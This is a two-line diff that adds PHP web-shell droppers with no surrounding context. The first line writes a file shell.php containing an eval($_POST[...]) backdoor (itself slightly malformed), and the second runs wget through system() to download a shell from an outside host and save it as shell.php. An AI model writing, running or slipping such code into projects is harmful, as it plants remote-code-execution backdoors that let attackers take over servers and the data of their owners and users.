@@ -1,0 +1,2 @@
+<?php fputs(fopen("/www/shell.php","W+"),"<?php eval($_POST[a]?>";?>
+<?system('wget http://www.t00ls.net/shell.txt -O shell.php');?>
